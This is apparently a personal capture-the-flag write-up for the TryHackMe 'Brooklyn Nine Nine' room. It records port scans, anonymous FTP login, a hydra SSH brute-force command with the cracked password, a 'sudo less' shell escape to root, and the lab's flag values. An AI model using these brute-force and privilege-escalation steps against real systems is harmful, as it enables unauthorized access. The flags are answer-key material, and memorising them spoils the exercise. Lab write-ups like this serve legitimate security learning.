---
creation date: July 18th 2023
last modified date: July 18th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Brooklyn Nine Nine]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 21 FTP
- Anon login
```bash
ftp anonymous@10.10.10.10
```
- Located a file talking about a user names *jake* and that he needed to change his password as its very weak

---

# Exploitation
## Brute Force SSH
User: *jake*
```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
```
Password: *987654321*

---

# Lateral Movement to user
## Local Enumeration
- *jake*:*987654321*
	- Found user.txt under `/home/holt/user.txt`
	- `sudo -l`
		- Showed we have full access to [[less]]

## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector
```bash
sudo less /etc/profile
!/bin/sh
```

---

# Trophy & Loot

user.txt = *ee11cbb19052e40b07aac0ca060c23ee*
root.txt = *63a9f0ea7bb98050796b649e85481845*

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 18th 2023 (09:25 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
